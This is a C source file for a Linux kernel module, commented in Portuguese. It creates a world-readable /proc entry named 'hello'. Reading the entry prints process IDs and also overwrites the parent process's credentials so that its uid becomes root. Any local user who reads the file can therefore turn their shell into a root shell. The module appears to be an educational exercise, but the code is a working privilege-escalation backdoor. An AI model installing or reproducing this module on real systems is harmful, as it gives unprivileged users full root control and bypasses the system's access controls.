#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/sched.h>


static int hello_show(struct seq_file *m, void *v) {
	//Exibe o PID do processo atual e do pai
  seq_printf(m, "Processo atual: %d\nProcesso pai: %d\n", current->pid, current->parent->pid);
	
 	
	struct cred *cred;	
	//Ponteiro para acessar a estrutura cred	
	cred = (struct cred *) get_cred(current->parent->cred);

	//Muda a permissao do usuario para ROOT
	cred->uid = GLOBAL_ROOT_UID;
  put_cred(cred);
	//Mostra a permissao do interpretador de comandos
  seq_printf(m, "Permissao do interpretador de comandos: %d\n", current->parent->cred->uid);
		

  return 0;
}

static int hello_open(struct inode *inode, struct file *file) {
  return single_open(file, hello_show, NULL);
}

static const struct file_operations hello_fops = {
  .owner	= THIS_MODULE,
  .open	        = hello_open,
  .read	        = seq_read,
  .llseek	= seq_lseek,
  .release	= single_release,
};

int init_module(void) {
  if (!proc_create("hello", 0644, NULL, &hello_fops)) {
    printk("Problema com o módulo!\n");
    return -ENOMEM;
  }
  printk("Módulo carregado!\n");
  return 0;
}

void cleanup_module(void) {
  remove_proc_entry("hello", NULL);
  printk("Módulo descarregado!\n");
}

MODULE_LICENSE("GPL");
